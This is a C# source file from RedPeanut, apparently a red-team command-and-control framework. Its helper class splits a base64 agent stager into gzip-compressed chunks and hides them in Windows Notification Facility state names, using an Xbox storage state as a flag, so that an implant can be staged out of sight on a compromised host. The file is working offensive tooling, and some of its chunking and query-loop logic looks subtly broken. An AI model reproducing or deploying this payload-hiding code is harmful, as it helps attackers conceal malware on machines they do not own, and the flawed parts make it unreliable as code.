//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using RedPeanutAgent.Core;
using System;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using System.IO.Compression;

namespace RedPeanutAgent.Execution
{
    class WnfHelper
    {
        private static bool RemoveData()
        {
            if (QueryWnf(Natives.WNF_XBOX_STORAGE_CHANGED).Data.Length > 0)
            {
                var s1 = UpdateWnf(Natives.PART_1, new byte[] { });
                var s2 = UpdateWnf(Natives.PART_2, new byte[] { });
                var s3 = UpdateWnf(Natives.PART_3, new byte[] { });
                var s4 = UpdateWnf(Natives.PART_4, new byte[] { });
                var s5 = UpdateWnf(Natives.PART_5, new byte[] { });

                UpdateWnf(Natives.WNF_XBOX_STORAGE_CHANGED, new byte[0] { });
            }

            return true;
        }

        public static void WriteWnF(string agentB64)
        {
            var stager = new byte[0];

            RemoveData();

            if (QueryWnf(Natives.WNF_XBOX_STORAGE_CHANGED).Data.Length <= 0)
            {

                var s1 = UpdateWnf(Natives.PART_1, new byte[] { });
                var s2 = UpdateWnf(Natives.PART_2, new byte[] { });
                var s3 = UpdateWnf(Natives.PART_3, new byte[] { });
                var s4 = UpdateWnf(Natives.PART_4, new byte[] { });
                var s5 = UpdateWnf(Natives.PART_5, new byte[] { });

                stager = Encoding.Default.GetBytes(agentB64);

                var chunksize = stager.Length / 5;
                var part1 = new MemoryStream();
                var part2 = new MemoryStream();
                var part3 = new MemoryStream();
                var part4 = new MemoryStream();
                var part5 = new MemoryStream();

                part1.Write(stager, 0, chunksize);
                part2.Write(stager, chunksize, chunksize);
                part3.Write(stager, chunksize * 2, chunksize);
                part4.Write(stager, chunksize * 3, stager.Length - (chunksize * 3));
                //
                part5.Write(stager, chunksize * 4, stager.Length - (chunksize * 4));

                var p1_compressed = CompressGZipAssembly(part1.ToArray());
                var p2_compressed = CompressGZipAssembly(part2.ToArray());
                var p3_compressed = CompressGZipAssembly(part3.ToArray());
                var p4_compressed = CompressGZipAssembly(part4.ToArray());
                var p5_compressed = CompressGZipAssembly(part5.ToArray());

                if (
                    (p1_compressed.Length > 2048) ||
                    (p2_compressed.Length > 2048) ||
                    (p3_compressed.Length > 2048) ||
                    (p4_compressed.Length > 2048) ||
                    (p5_compressed.Length > 2048)
                )
                {
                    Console.WriteLine("Error, size too large!");
                    return;
                }

                s1 = UpdateWnf(Natives.PART_1, p1_compressed);
                s2 = UpdateWnf(Natives.PART_2, p2_compressed);
                s3 = UpdateWnf(Natives.PART_3, p3_compressed);
                s4 = UpdateWnf(Natives.PART_4, p4_compressed);
                s5 = UpdateWnf(Natives.PART_5, p5_compressed);

                UpdateWnf(Natives.WNF_XBOX_STORAGE_CHANGED, new byte[1] { 0x1 });
            }
        }

        public static int UpdateWnf(ulong state, byte[] data)
        {
            using (var buffer = data.ToBuffer())
            {
                ulong state_name = state;

                return Natives.ZwUpdateWnfStateData(ref state_name, buffer,
                    buffer.Length, null, IntPtr.Zero, 0, false);
            }
        }

        public static Natives.WnfStateData QueryWnf(ulong state)
        {
            var data = new Natives.WnfStateData();
            int tries = 10;
            int size = 4096;
            while (tries-- > 0)
            {
                using (var buffer = new SafeHGlobalBuffer(size))
                {
                    int status;
                    status = Natives.ZwQueryWnfStateData(ref state, null, IntPtr.Zero, out int changestamp, buffer, ref size);

                    if (status == 0xC0000023)
                        continue;
                    data = new Natives.WnfStateData(changestamp, buffer.ReadBytes(size));
                }
            }
            return data;
        }

        public static byte[] CompressGZipAssembly(byte[] bytes)
        {
            MemoryStream mems = new MemoryStream();
            GZipStream zips = new GZipStream(mems, CompressionMode.Compress);
            zips.Write(bytes, 0, bytes.Length);
            zips.Close();
            mems.Close();

            return mems.ToArray();
        }
    }

    // Original dev: James Forshaw @tyranid: Project Zero
    // Ref: https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/46b95cba8f76fae9a5c8258d13057d5edfacdf90/NtApiDotNet/SafeHandles.cs
    public class SafeHGlobalBuffer : SafeBuffer
    {
        public SafeHGlobalBuffer(int length)
          : this(length, length) { }

        protected SafeHGlobalBuffer(int allocation_length, int total_length)
            : this(Marshal.AllocHGlobal(allocation_length), total_length, true) { }

        public SafeHGlobalBuffer(IntPtr buffer, int length, bool owns_handle)
          : base(owns_handle)
        {
            Length = length;
            Initialize((ulong)length);
            SetHandle(buffer);
        }


        public static SafeHGlobalBuffer Null { get { return new SafeHGlobalBuffer(IntPtr.Zero, 0, false); } }

        protected override bool ReleaseHandle()
        {
            if (!IsInvalid)
            {
                Marshal.FreeHGlobal(handle);
                handle = IntPtr.Zero;
            }
            return true;
        }

        public byte[] ReadBytes(ulong byte_offset, int count)
        {
            byte[] ret = new byte[count];
            ReadArray(byte_offset, ret, 0, count);
            return ret;
        }

        public byte[] ReadBytes(int count)
        {
            return ReadBytes(0, count);
        }

        public SafeHGlobalBuffer(byte[] data) : this(data.Length)
        {
            Marshal.Copy(data, 0, handle, data.Length);
        }

        public int Length
        {
            get; private set;
        }
    }


    static class BufferUtils
    {
        public static SafeHGlobalBuffer ToBuffer(this byte[] value)
        {
            return new SafeHGlobalBuffer(value);
        }
    }
}
